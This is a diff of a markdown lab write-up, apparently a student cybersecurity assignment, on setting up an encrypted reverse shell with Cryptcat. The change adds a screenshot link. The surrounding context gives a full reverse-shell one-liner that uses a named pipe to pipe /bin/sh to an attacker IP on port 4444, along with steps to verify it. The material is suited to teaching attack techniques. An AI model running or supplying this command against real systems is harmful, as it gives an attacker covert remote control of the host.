@@ -141,7 +141,7 @@ This section explains the step-by-step execution using Cryptcat, reproducing the
 **Command:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | cryptcat 10.x.x.x 4444 -k <Password> > /tmp/f`  
 **Reason of command:** Because modern Linux systems disable the easy -e execution flag, this command creates a "Named Pipe" (mkfifo). It loops the input and output of a hidden bash shell directly into the encrypted Cryptcat tunnel pointing back to the attacker's IP.  
 ### Step 3: Verification  
-![image alt]()    
+![image alt](https://github.com/cybers6064-pair/TMV6064-Cybersecurity-Assignment-1/blob/ff652afbf9000ee4baa3b1332c6e5a754b522db8/Task%202%20images/Cryptcat3.png)      
 **Action:** Executing commands such as `id` and `ls` on the listener terminal.  
 **Reason of action:** To prove that the network tunnel is successfully routing system commands back and forth securely.  
 
